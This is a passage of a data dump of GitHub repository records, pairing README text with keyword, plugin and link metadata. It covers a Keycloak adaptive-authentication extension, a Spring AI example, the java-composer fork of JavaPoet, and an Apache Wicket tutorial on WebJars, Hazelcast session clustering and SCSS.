",0,13,7,apache-2.0,1.0,"['keycloak', 'adaptive', 'authentication', 'extension', 'supported', 'ai', 'nlp', 'engine', 'openai', 'chatgpt', 'preview', 'ibm', 'granite', 'experimental', 'information', 'refer', 'readme', 'module', 'getting', 'started', 'container', 'use', 'container', 'image', 'running', 'command', 'start', 'keycloak', 'exposed', 'local', 'port', 'order', 'see', 'functionality', 'action', 'navigate', 'info', 'want', 'use', 'openai', 'capability', 'set', 'environment', 'variable', 'setting', 'image', 'described', 'readme', 'module', 'info', 'installed', 'docker', 'use', 'instead', 'building', 'source', 'build', 'source', 'every', 'module', 'refer', 'particular', 'readmes', 'follow', 'building', 'working', 'code', 'base', 'guide', 'resources', 'info', 'adaptive', 'authentication', 'vienna', 'austria', 'slide', 'talk', 'demo', 'keycloak', 'openshiftai', 'roadshow', 'bratislava', 'slovakia', 'slide', 'adaptive', 'authentication', 'master', 'thesis', 'completed', 'information', 'might', 'differ', 'document']","['keycloak', 'adaptive', 'authentication', 'module', 'use']",0,0,0,"['keycloak', 'adaptive', 'authentication', 'extension', 'support', 'ai', 'nlp', 'engine', 'get', 'start', 'container', 'building', 'source', 'resource', 'info']",6,"['keycloak', 'adaptive', 'authentication', 'extension', 'support']",0,0.0,6.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:exec-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,2.0,1877,24.8,5.645161290322581,"['KeyConf24 -> https://keyconf.dev/', 'Slides -> https://drive.google.com/file/d/1PESlDBR8P9nQJyPz_H45R3ZS4LjtSV_W/view?usp=sharing', 'Talk -> https://www.youtube.com/watch?v=0zWlc08CPuo', 'Demo -> https://drive.google.com/file/d/1dv5zWM69-KZyT3OUjLe-3b1GcI8ErDJ2/view?usp=sharing', 'Slides -> https://drive.google.com/file/d/1WscEQlWpjYdrOwGDMj9IDV6bARY-4Utn/view?usp=sharing', 'Document -> https://github.com/mabartos/adaptive-authn-docs/blob/main/Adaptive_Authentication_Final.pdf']",6
qq418745/spring-ai-example,master,"# spring-ai-example

![示例GIF](./example.gif)
### 前提条件

[application.yaml](src%2Fmain%2Fresources%2Fapplication.yaml) 中配置你的 API Key 启动即可 ~

### START

访问这里开始测试效果！

> http://localhost:8080/index.html

### 在线玩弄服务~
>  https://ai.coala.top/index.html



### PS

如果因不可抗力须使用代理站， [application.yaml](src%2Fmain%2Fresources%2Fapplication.yaml) 中记得配置 base-url

",0,0,1,apache-2.0,0.0,"['api', 'key', 'start', 'http', 'http', 'p']","['http', 'api', 'key', 'start', 'p']",2,0,0,"['start', 'p']",5,"['start', 'p']",0,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,350,22.0,5.704545454545454,[],0
Randgalt/java-composer,master,"[![Maven Build](https://github.com/Randgalt/java-composer/actions/workflows/ci.yml/badge.svg)](https://github.com/Randgalt/java-composer/actions/workflows/ci.yml)
[![Maven Central](https://img.shields.io/maven-central/v/io.soabase.java-composer/java-composer.svg?sort=date)](https://search.maven.org/search?q=g:io.soabase.java-composer%20a:java-composer)

# Java Composer

This is a soft-fork of [JavaPoet](https://github.com/square/javapoet). JavaPoet appears to have been abandoned and is missing 
support for post-Java 8 features. This repository exists solely to add those missing features until a time when JavaPoet 
chooses to reactivate.

Please see [JavaPoet](https://github.com/square/javapoet) for documentation, licensing, etc.

```xml
    <groupId>io.soabase.java-composer</groupId>
    <artifactId>java-composer</artifactId>
    <version>VERSION</version>
```

# Changes From JavaPoet

### March 26, 2024
- Require Java 17
- Add record support from https://github.com/square/javapoet/pull/981
- Support sealed/non-sealed/permits
",1,5,1,apache-2.0,15.0,"['java', 'composer', 'javapoet', 'javapoet', 'appears', 'abandoned', 'missing', 'support', 'feature', 'repository', 'exists', 'solely', 'add', 'missing', 'feature', 'time', 'javapoet', 'chooses', 'reactivate', 'please', 'see', 'javapoet', 'documentation', 'licensing', 'etc', 'change', 'javapoet', 'march', 'require', 'java', 'add', 'record', 'support', 'http', 'support']","['javapoet', 'support', 'java', 'missing', 'feature']",0,0,0,"['java', 'composer', 'change', 'from', 'javapoet', 'march']",3,"['java', 'composer', 'change', 'from', 'javapoet']",1,377.0,1.0,"[maven-gpg-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,1042,21.857142857142858,5.215686274509804,"['![Maven Build -> https://github.com/Randgalt/java-composer/actions/workflows/ci.yml/badge.svg', '![Maven Central -> https://img.shields.io/maven-central/v/io.soabase.java-composer/java-composer.svg?sort=date', 'JavaPoet -> https://github.com/square/javapoet', 'JavaPoet -> https://github.com/square/javapoet']",4
bitstorm/modern-webdev-wicket,main,"# Modern Web development with Apache Wicket, Spring Boot, Hazelcast and WebJars


When it comes to implement web applications, Java developers usually feel lost with modern web technologies and they might think that nowadays it's not possible to implement robust and maintainable web applications without adopting the standard JavaScript-based development stack. But what if I tell you that Java is a first-class platform also for web development and that you don't need to switch to a different technology?

The following is a list of _howto_ and example projects that show you how to use Apache Wicket and other familiar frameworks and tools from the Java ecosystem (like Hazelcast, Spring Boot, WebJars, Apache Maven, etc...) to build modern and scalable applications without leaving the Java platform.

More in details you will see how to reach the following goals:

- [Producing clean and resurce-friendly URLs](#produce-resource-friendly-urls)
- [Managing CSS and JavaScript resources with WebJars and Maven](#manage-css-and-javascript-libraries-with-webjars-and-maven)
- [Scaling your application with session clustering and caching](#use-spring-boot-and-hazelcast-to-scale-your-application-with-session-clustering-and-caching)
- [Styling your application using SCSS](#style-your-application-with-scss)

> [!NOTE]
> The following examples are based on Wicket 10 and Java 21, although they should work also for Wicket 9 and Java 17

## Produce resource-friendly URLs

#### Page mounting

Wicket already comes with a native solution to generate structured and resource-friendly URLs by mounting pages to a specific path:

```java
mountPage(""/path/to/page"", MountedPage.class);
```

The path used for mounted pages can contain also segments with dynamic values and they are declared using a special syntax:

```java
/*
 In the following example the path used to mount UserPage has a required parameter
 (userId) and an optional one (taxId).

 For example the following path are both valid:
  - ""/user/123/details/ABC1234567""
  - ""/user/123/details""
*/

mountPage(""/user/${userId}/details/#{taxId}"", UserPage.class);
```

For a full description of page mounting see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_generating_structured_and_clear_urls)


#### Remove page id from URL

By default Wicket uses a _versioning_ system for stateful pages assiging a incremental id to each version of the pages. This id is usually appended as query parameter at the end of the page's URL:

```
www.myhost.net/page-path?1234
```

The purpose of page versioning is to support browser’s back button: when this button is pressed Wicket must respond by rendering the same page instance previously used.
Again, for a full description of this mechanism see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_page_versioning_and_caching)

Usually having this id at the end of the page URL is not a big deal, but sometimes you might prefer simply hiding it in the final URL.  

```java
public class NoPageIdMapper extends MountedMapper {

    public NoPageIdMapper(String mountPath, Class<? extends IRequestablePage> pageClass) {
        super(mountPath, pageClass);
    }

    @Override
    protected void encodePageComponentInfo(Url url, PageComponentInfo info) {
        //if componentInfo is null we have a page url and we skip page parameters, otherwise we keep them
        if (info.getComponentInfo() != null) {
            super.encodePageComponentInfo(url, info);
        }

    }
}
```
Please note that this mapper will remove version id only for page URLs, so stateful behaviors (like AJAX behaviors) will continue to work as usual.  

Once we created our custom mapper we must use it to mount our pages: 

```java
public void init()
{
	super.init();

	NoPageIdMapper mapper = new NoPageIdMapper(path, pageClass);
	mount(mapper);
}
```

> [!WARNING]
> Keep in mind that by removing the page id from URL you will lost the browser’s back button support.

## Manage CSS and JavaScript libraries with WebJars and Maven

WebJars is a project aimed to provide client-side libraries distributions as Maven dependency. In this way these libraries can be read directly from JAR files as regular dependecies. WebJars comes with numerous Java libraries to easily integrate this framework with the most popular web frameworks, Wicket included.

For example (project _wicket-webjars_) let's say we want to use Bootstrap 5.3.3 in our Wicket application. The first step is to include the following dependecies in our pom.xml:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars.npm</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

The first dependency is the library that allows to use WebJars with Wicket while the second is the Bootstrap library distributed by WebJars project.
The second configuration step is the initialization of _wicket-webjars_ library with the following simple code line in our application _init()_ method:

```java
public void init()
{
	super.init();

	// init wicket-webjars library
	WicketWebjars.install(this);
}
```

Now we can add Bootstrap to our page as Wicket CssHeaderItem using reference class _WebjarsCssResourceReference_

```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/5.3.3/css/bootstrap.min.css"")));

}
```

The path used with _WebjarsCssResourceReference_ is appendend to _META-INF/resources/webjars/_ to obtain the path to the desired file inside the library jar. See the [official WebJars site](https://www.webjars.org) to have a look at the content of jar libraries.

To automatically use the version of a WebJar library from your pom.xml, we can simply replace the version in path with the _current_ string. When a resource name is resolved this string will be replaced with the most recent available version in classpath: 


```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/current/css/bootstrap.min.css"")));

}
```

It is also possible to use a resource directly from html markup prepending _/webjars/_ to the resource path:

```html
<link rel='stylesheet' href='/webjars/bootstrap/5.3.3/css/bootstrap.min.css'>
```

> [!WARNING]
> If you are using Jetty remember that resource can be used from html only from version 12.

The project can be started with command `mvn jetty:run`. The page can be seen opening your browser at [http://localhost:8080](http://localhost:8080)

## Use Spring Boot and Hazelcast to scale your application with session clustering and caching

Scaling a web application is not a trivial task and it usually involves a lot of work on additional architectural aspects such as caching, services orchestration and replication, etc... Java developers can count on different valuable frameworks that can dramatically help handling those aspects providing a distributed data storage that can be used both as caching service and coordinator between two or more JVM. One of these framework is [Hazelcast](https://hazelcast.com/) which can be used also for web session clustering. 

In this example (project _wicket-hazelcast_) we will see how to use integrate Wicket with Spring Boot and Hazelcast to share and replicate web session among two or more server instances making our application fault tolerant and scalable.

Our application is a Spring Boot-based web application using Apache Wicket. Let's see the required dependecies to our pom.xml:


```xml
<!-- SESSION REPLICATION -->
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-core</artifactId>
    <version>3.2.2</version>
</dependency>

<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-hazelcast</artifactId>
    <version>3.2.2</version>          
</dependency>

<!-- WICKET SPRING BOOT INTEGRATION -->
<dependency>
  <groupId>com.giffing.wicket.spring.boot.starter</groupId>
  <artifactId>wicket-spring-boot-starter</artifactId>
  <version>4.0.0</version>        
</dependency>

<!-- WICKET HAZELCAST INTEGRATION -->
<dependency>
    <groupId>org.wicketstuff</groupId>
    <artifactId>wicketstuff-datastore-hazelcast</artifactId>
    <version>10.0.0</version>
</dependency>

<!-- SPRING HAZELCAST INTEGRATION (for caching) -->
<dependency>
    <groupId>com.hazelcast</groupId>
    <artifactId>hazelcast-spring</artifactId>
    <version>5.3.6</version>
</dependency>
```

The main dependency is probably the one on [Wicket and Spring Boot integration project](https://github.com/MarcGiffing/wicket-spring-boot) (artifactId _wicket-spring-boot-starter_) which lays the foundation for our application.
The other dependencies are for Hazelcast integration with Spring and Wicket and for web session clustering.

Now let's look at the code starting with the configuration required to create an _HazelcastConfig_ instance for our application. This is basically the code used in the official [Hazelcast tutorial](https://docs.hazelcast.com/tutorials/spring-session-hazelcast)


```java
@Configuration
@EnableHazelcastHttpSession
@EnableCaching
public class HazelcastConfig {

    @SpringSessionHazelcastInstance
    @Bean(destroyMethod = ""shutdown"")
    public HazelcastInstance hazelcastInstance() {
        Config config = new Config();

        JoinConfig join = config.getNetworkConfig().getJoin();
        // enabling multicast for autodiscovery.
        join.getMulticastConfig().setEnabled(true);

        AttributeConfig attributeConfig = new AttributeConfig()
                .setName(HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE)
                .setExtractorClassName(PrincipalNameExtractor.class.getName());

        config.getMapConfig(HazelcastIndexedSessionRepository.DEFAULT_SESSION_MAP_NAME)
            .addAttributeConfig(attributeConfig).addIndexConfig(
                new IndexConfig(IndexType.HASH, HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE));
        
        // use custom serializer for better performances. This is optional.
        SerializerConfig serializerConfig = new SerializerConfig();
        serializerConfig.setImplementation(new HazelcastSessionSerializer()).setTypeClass(MapSession.class);
        config.getSerializationConfig().addSerializerConfig(serializerConfig);

        return Hazelcast.newHazelcastInstance(config);
    }

    @Bean
    public CacheManager cacheManager(HazelcastInstance hazelcastInstance) {
        return new HazelcastCacheManager(hazelcastInstance);
    }

}
```

In the class above we used two annotation (beside _@Configuration_), one to enable session clustering with Hazelcast (_@EnableHazelcastHttpSession_) and another to enable Spring caching support (_@EnableCaching_) backed by Hazelcast. Spring caching requires to create a bean of type _CacheManager_

> [!NOTE]
> Spring caching is enabled only for illustration purpose as it's not used in the example code. However with a _CacheManager_ bean created, you can use Spring annotations to [cache the results of you services](https://www.baeldung.com/spring-cache-tutorial).

> [!WARNING]
> Please note that for sake of simplicity we enabled multicast for autodiscovery, so Hazelcast will automatically add to the cluster any new application instance visible on our local network. Keep in mind that multicast is usually not suited for production environment where a safer join configuration is usually required. See the [Hazelcast documentation](https://docs.hazelcast.com/hazelcast/5.4/clusters/network-configuration) for more information on network configuration.


As final configuration step we must tell Wicket to store statefull page instances using Hazelcast. This is done inside Application _init()_ method registering a custom _PageManagerProvider_ using class _HazelcastDataStore_ from WicketStuff project. We also use class _SessionQuotaManagingDataStore_ to limit page storing to max 4 instances per session:

```java
@Override
public void init()
{
	super.init();

	// add your configuration here
	HazelcastInstance instance = getApplicationContext().getBean(HazelcastInstance.class);

	setPageManagerProvider(new DefaultPageManagerProvider(this) {
	    @Override
	    protected IPageStore newPersistentStore() {
		HazelcastDataStore hazelcastDataStore = new HazelcastDataStore(getName(), instance);
	
		return new SessionQuotaManagingDataStore(hazelcastDataStore, 4);
	    }
	});
}
```

With all configuration code in place we can start our application with the following command (assuming port 8083 is free on our machine).

```
SERVER_PORT=8083 mvn spring-boot:run
```

Taking a look at our application logs we can see a message from Hazelcast confirming that a new cluster has been created and the application has successfully joined it:

```
2024-06-13 11:39:30.169 [main] INFO  com.hazelcast.core.LifecycleService - [10.3.0.8]:5702 [dev] [5.3.6] [10.3.0.8]:5702 is STARTING
2024-06-13 11:39:32.835 [main] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5702 [dev] [5.3.6] 

Members {size:1, ver:1} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6 this
]
```

Once the application is up we can open our browser at [http://localhost:8083](http://localhost:8083) and check the given sessionId value. Now let's start a second instance of our application. We expect it tojoin the existing cluster and using the same shared web session. The application can be started with the same command seen above but using a different available port:

```
SERVER_PORT=8084 mvn spring-boot:run
```

Again, looking at the logs of both this new instance or the existing one we should see that the new one has joined the cluster:

```
2024-06-13 11:51:35.757 [hz.gallant_kapitsa.IO.thread-in-0] INFO  c.h.i.server.tcp.TcpServerConnection - [10.3.0.8]:5703 [dev] [5.3.6] Initialized new cluster connection between /10.3.0.8:43349 and /10.3.0.8:5702
2024-06-13 11:51:41.000 [hz.gallant_kapitsa.priority-generic-operation.thread-0] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5703 [dev] [5.3.6] 

Members {size:2, ver:2} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6
	Member [10.3.0.8]:5703 - bf396942-563d-4750-a0ba-0bac3e241fc8 this
]
```

Opening our browser at [http://localhost:8084](http://localhost:8084) we should have the confirm that the new instance is using the same session with the same id.
Feel free to play around stopping/restarting one of the two instances at a time to see that the session isn't lost as long as one instance is still active. 

## Style your application with SCSS

When it comes to web application styling, SCSS is a precious ally as it allows to use a more advanced syntax to manage and organize our css resources. Since SCSS needs to be converted in standard CSS language, we need a compiler to perform this task.

For developers it would be even better if this compiler could operate ""live"", automatically compiling SCSS sources as they are modified. Most of the time this time of compiler requires to use a dedicated external application or some kind of IDE extention to monitor our SCSS files and recompile them as they get modified. \
With Wicket we can use library _wicket-bootstrap-sass_ that offers an even more flexible solution in the form of [CSS resource](https://nightlies.apache.org/wicket/guide/10.x/single.html#_resource_management_with_wicket) that points to a SCSS file and compiles it on the fly, without depending on an external application.

> [!NOTE]
> Library _wicket-bootstrap-sass_ depends on OS library [libsass](https://github.com/sass/libsass), so be sure to have it already installed before running the following example code.

Example project _wicket-scss_ uses both library _wicket-bootstrap-sass_ and _WebJars_ to show how to easily customize Bootstrap 5 style using a SCSS file that extends the default _bootstrap.scss_ file distributed with WebJars dependency.

The project has the same dependencies seen for project _wicket-webjar_ in addition to module _wicket-bootstrap-sass_:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>de.agilecoders.wicket</groupId>
    <artifactId>wicket-bootstrap-sass</artifactId>
    <version>7.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

In our application's _init()_ method we initialize both WebJars and SASS integration: 

```java
@Override
public void init()
{
    super.init();

   
    // init wicket WebJars and SASS library
    WicketWebjars.install(this);
    BootstrapSass.install(this);
}
```

Next, let's have a look at the file _custom-css.scss_ we will use to customize our Boostrap 5 based theme:

```scss
//SCSS VARIABLE OVERRIDING
$primary: #397EB4;
$warning: #f19027;
$min-contrast-ratio: 3;


//INCLUDING MAIN BOOTSTRAP SCSSS
@import ""webjars!bootstrap/current/scss/bootstrap.scss"";
```

The file has a starting section where we override some of the Bootstrap variables (see [official documentation](https://getbootstrap.com/docs/5.0/customize/sass/#modify-map)) to customize colors for primary and warning buttons. \
The last line imports the main Bootstrap 5.3.3 SCSS which is loaded from the corresponding WebJar using the syntax _webjars!<path_to_file>_

Finally, our file _custom-css.scss_ can be used as regular Wicket CSS header item using class _SassResourceReference_ that takes care of compilation behind the scenes:

```java
protected final CssReferenceHeaderItem customCss = 
    CssHeaderItem.forReference(new SassResourceReference(HomePage.class, ""custom-css.scss""));

@Override
public void renderHead(IHeaderResponse response) {
    response.render(customCss);
}
```

Once the application is started (with the usual command `mvn jetty:run`.) you can play around modifying file _custom-css.scss_ and see changes in real time.
",0,0,1,apache-2.0,0.0,"['modern', 'web', 'development', 'apache', 'wicket', 'spring', 'boot', 'hazelcast', 'webjars', 'come', 'implement', 'web', 'application', 'java', 'developer', 'usually', 'feel', 'lost', 'modern', 'web', 'technology', 'might', 'think', 'nowadays', 'possible', 'implement', 'robust', 'maintainable', 'web', 'application', 'without', 'adopting', 'standard', 'development', 'stack', 'tell', 'java', 'platform', 'also', 'web', 'development', 'need', 'switch', 'different', 'technology', 'following', 'list', 'howto', 'example', 'project', 'show', 'use', 'apache', 'wicket', 'familiar', 'framework', 'tool', 'java', 'ecosystem', 'like', 'hazelcast', 'spring', 'boot', 'webjars', 'apache', 'maven', 'etc', 'build', 'modern', 'scalable', 'application', 'without', 'leaving', 'java', 'platform', 'detail', 'see', 'reach', 'following', 'goal', 'producing', 'clean', 'url', 'managing', 'cs', 'javascript', 'resource', 'webjars', 'maven', 'scaling', 'application', 'session', 'clustering', 'caching', 'styling', 'application', 'using', 'scss', 'note', 'following', 'example', 'based', 'wicket', 'java', 'although', 'work', 'also', 'wicket', 'java', 'produce', 'url', 'page', 'mounting', 'wicket', 'already', 'come', 'native', 'solution', 'generate', 'structured', 'url', 'mounting', 'page', 'specific', 'path', 'path', 'used', 'mounted', 'page', 'contain', 'also', 'segment', 'dynamic', 'value', 'declared', 'using', 'special', 'syntax', 'full', 'description', 'page', 'mounting', 'see', 'related', 'user', 'guide', 'paragraph', 'remove', 'page', 'id', 'url', 'default', 'wicket', 'us', 'versioning', 'system', 'stateful', 'page', 'assiging', 'incremental', 'id', 'version', 'page', 'id', 'usually', 'appended', 'query', 'parameter', 'end', 'page', 'url', 'purpose', 'page', 'versioning', 'support', 'browser', 'back', 'button', 'button', 'pressed', 'wicket', 'must', 'respond', 'rendering', 'page', 'instance', 'previously', 'used', 'full', 'description', 'mechanism', 'see', 'related', 'user', 'guide', 'paragraph', 'usually', 'id', 'end', 'page', 'url', 'big', 'deal', 'sometimes', 'might', 'prefer', 'simply', 'hiding', 'final', 'url', 'please', 'note', 'mapper', 'remove', 'version', 'id', 'page', 'url', 'stateful', 'behavior', 'like', 'ajax', 'behavior', 'continue', 'work', 'usual', 'created', 'custom', 'mapper', 'must', 'use', 'mount', 'page', 'warning', 'keep', 'mind', 'removing', 'page', 'id', 'url', 'lost', 'browser', 'back', 'button', 'support', 'manage', 'cs', 'javascript', 'library', 'webjars', 'maven', 'webjars', 'project', 'aimed', 'provide', 'library', 'distribution', 'maven', 'dependency', 'way', 'library', 'read', 'directly', 'jar', 'file', 'regular', 'dependecies', 'webjars', 'come', 'numerous', 'java', 'library', 'easily', 'integrate', 'framework', 'popular', 'web', 'framework', 'wicket', 'included', 'example', 'project', 'let', 'say', 'want', 'use', 'bootstrap', 'wicket', 'application', 'first', 'step', 'include', 'following', 'dependecies', 'first', 'dependency', 'library', 'allows', 'use', 'webjars', 'wicket', 'second', 'bootstrap', 'library', 'distributed', 'webjars', 'project', 'second', 'configuration', 'step', 'initialization', 'library', 'following', 'simple', 'code', 'line', 'application', 'init', 'method', 'add', 'bootstrap', 'page', 'wicket', 'cssheaderitem', 'using', 'reference', 'class', 'webjarscssresourcereference', 'path', 'used', 'webjarscssresourcereference', 'appendend', 'obtain', 'path', 'desired', 'file', 'inside', 'library', 'jar', 'see', 'official', 'webjars', 'site', 'look', 'content', 'jar', 'library', 'automatically', 'use', 'version', 'webjar', 'library', 'simply', 'replace', 'version', 'path', 'current', 'string', 'resource', 'name', 'resolved', 'string', 'replaced', 'recent', 'available', 'version', 'classpath', 'also', 'possible', 'use', 'resource', 'directly', 'html', 'markup', 'prepending', 'resource', 'path', 'warning', 'using', 'jetty', 'remember', 'resource', 'used', 'html', 'version', 'project', 'started', 'command', 'page', 'seen', 'opening', 'browser', 'http', 'use', 'spring', 'boot', 'hazelcast', 'scale', 'application', 'session', 'clustering', 'caching', 'scaling', 'web', 'application', 'trivial', 'task', 'usually', 'involves', 'lot', 'work', 'additional', 'architectural', 'aspect', 'caching', 'service', 'orchestration', 'replication', 'etc', 'java', 'developer', 'count', 'different', 'valuable', 'framework', 'dramatically', 'help', 'handling', 'aspect', 'providing', 'distributed', 'data', 'storage', 'used', 'caching', 'service', 'coordinator', 'two', 'jvm', 'one', 'framework', 'hazelcast', 'used', 'also', 'web', 'session', 'clustering', 'example', 'project', 'see', 'use', 'integrate', 'wicket', 'spring', 'boot', 'hazelcast', 'share', 'replicate', 'web', 'session', 'among', 'two', 'server', 'instance', 'making', 'application', 'fault', 'tolerant', 'scalable', 'application', 'spring', 'web', 'application', 'using', 'apache', 'wicket', 'let', 'see', 'required', 'dependecies', 'main', 'dependency', 'probably', 'one', 'wicket', 'spring', 'boot', 'integration', 'project', 'artifactid', 'lay', 'foundation', 'application', 'dependency', 'hazelcast', 'integration', 'spring', 'wicket', 'web', 'session', 'clustering', 'let', 'look', 'code', 'starting', 'configuration', 'required', 'create', 'hazelcastconfig', 'instance', 'application', 'basically', 'code', 'used', 'official', 'hazelcast', 'tutorial', 'class', 'used', 'two', 'annotation', 'beside', 'configuration', 'one', 'enable', 'session', 'clustering', 'hazelcast', 'enablehazelcasthttpsession', 'another', 'enable', 'spring', 'caching', 'support', 'enablecaching', 'backed', 'hazelcast', 'spring', 'caching', 'requires', 'create', 'bean', 'type', 'cachemanager', 'note', 'spring', 'caching', 'enabled', 'illustration', 'purpose', 'used', 'example', 'code', 'however', 'cachemanager', 'bean', 'created', 'use', 'spring', 'annotation', 'cache', 'result', 'service', 'warning', 'please', 'note', 'sake', 'simplicity', 'enabled', 'multicast', 'autodiscovery', 'hazelcast', 'automatically', 'add', 'cluster', 'new', 'application', 'instance', 'visible', 'local', 'network', 'keep', 'mind', 'multicast', 'usually', 'suited', 'production', 'environment', 'safer', 'join', 'configuration', 'usually', 'required', 'see', 'hazelcast', 'documentation', 'information', 'network', 'configuration', 'final', 'configuration', 'step', 'must', 'tell', 'wicket', 'store', 'statefull', 'page', 'instance', 'using', 'hazelcast', 'done', 'inside', 'application', 'init', 'method', 'registering', 'custom', 'pagemanagerprovider', 'using', 'class', 'hazelcastdatastore', 'wicketstuff', 'project', 'also', 'use', 'class', 'sessionquotamanagingdatastore', 'limit', 'page', 'storing', 'max', 'instance', 'per', 'session', 'configuration', 'code', 'place', 'start', 'application', 'following', 'command', 'assuming', 'port', 'free', 'machine', 'taking', 'look', 'application', 'log', 'see', 'message', 'hazelcast', 'confirming', 'new', 'cluster', 'created', 'application', 'successfully', 'joined', 'application', 'open', 'browser', 'http', 'check', 'given', 'sessionid', 'value', 'let', 'start', 'second', 'instance', 'application', 'expect', 'tojoin', 'existing', 'cluster', 'using', 'shared', 'web', 'session', 'application', 'started', 'command', 'seen', 'using', 'different', 'available', 'port', 'looking', 'log', 'new', 'instance', 'existing', 'one', 'see', 'new', 'one', 'joined', 'cluster', 'opening', 'browser', 'http', 'confirm', 'new', 'instance', 'using', 'session', 'id', 'feel', 'free', 'play', 'around', 'one', 'two', 'instance', 'time', 'see', 'session', 'lost', 'long', 'one', 'instance', 'still', 'active', 'style', 'application', 'scss', 'come', 'web', 'application', 'styling', 'scss', 'precious', 'ally', 'allows', 'use', 'advanced', 'syntax', 'manage', 'organize', 'cs', 'resource', 'since', 'scss', 'need', 'converted', 'standard', 'cs', 'language', 'need', 'compiler', 'perform', 'task', 'developer', 'would', 'even', 'better', 'compiler', 'could', 'operate', 'live', 'automatically', 'compiling', 'scss', 'source', 'modified', 'time', 'time', 'compiler', 'requires', 'use', 'dedicated', 'external', 'application', 'kind', 'ide', 'extention', 'monitor', 'scss', 'file', 'recompile', 'get', 'modified', 'wicket', 'use', 'library', 'offer', 'even', 'flexible', 'solution', 'form', 'cs', 'resource', 'point', 'scss', 'file', 'compiles', 'fly', 'without', 'depending', 'external', 'application', 'note', 'library', 'depends', 'o', 'library', 'libsass', 'sure', 'already', 'installed', 'running', 'following', 'example', 'code', 'example', 'project', 'us', 'library', 'webjars', 'show', 'easily', 'customize', 'bootstrap', 'style', 'using', 'scss', 'file', 'extends', 'default', 'file', 'distributed', 'webjars', 'dependency', 'project', 'dependency', 'seen', 'project', 'addition', 'module', 'application', 'init', 'method', 'initialize', 'webjars', 'sas', 'integration', 'next', 'let', 'look', 'file', 'use', 'customize', 'boostrap', 'based', 'theme', 'file', 'starting', 'section', 'override', 'bootstrap', 'variable', 'see', 'official', 'documentation', 'customize', 'color', 'primary', 'warning', 'button', 'last', 'line', 'import', 'main', 'bootstrap', 'scss', 'loaded', 'corresponding', 'webjar', 'using', 'syntax', 'webjars', 'finally', 'file', 'used', 'regular', 'wicket', 'cs', 'header', 'item', 'using', 'class', 'sassresourcereference', 'take', 'care', 'compilation', 'behind', 'scene', 'application', 'started', 'usual', 'command', 'play', 'around', 'modifying', 'file', 'see', 'change', 'real', 'time']","['application', 'wicket', 'page', 'use', 'library']",9,0,0,"['modern', 'web', 'development', 'apache', 'wicket', 'spring', 'boot', 'hazelcast', 'webjars', 'produce', 'url', 'page', 'mount', 'remove', 'page', 'id', 'url', 'manage', 'cs', 'javascript', 'libraries', 'webjars', 'maven', 'use', 'spring', 'boot', 'hazelcast', 'scale', 'application', 'session', 'cluster', 'cache', 'style', 'application', 'scss']",7,"['spring', 'boot', 'hazelcast', 'webjars', 'url']",21,0.0,3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin,org.eclipse.jetty:jetty-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",3.0,0.0,0.0,18410,47.55555555555556,5.524532710280374,"['user guide paragraph -> https://nightlies.apache.org/wicket/guide/10.x/single.html#_generating_structured_and_clear_urls', 'user guide paragraph -> https://nightlies.apache.org/wicket/guide/10.x/single.html#_page_versioning_and_caching', 'official WebJars site -> https://www.webjars.org', 'http://localhost:8080 -> http://localhost:8080', 'Hazelcast -> https://hazelcast.com/', 'Wicket and Spring Boot integration project -> https://github.com/MarcGiffing/wicket-spring-boot', 'Hazelcast tutorial -> https://docs.hazelcast.com/tutorials/spring-session-hazelcast', 'cache the results of you services -> https://www.baeldung.com/spring-cache-tutorial', 'Hazelcast documentation -> https://docs.hazelcast.com/hazelcast/5.4/clusters/network-configuration', 'http://localhost:8083 -> http://localhost:8083', 'http://localhost:8084 -> http://localhost:8084', 'CSS resource -> https://nightlies.apache.org/wicket/guide/10.x/single.html#_resource_management_with_wicket', 'libsass -> https://github.com/sass/libsass', 'official documentation -> https://getbootstrap.com/docs/5.0/customize/sass/#modify-map', 'main', 'dev', 'main', 'dev', 'dev', 'dev']",20
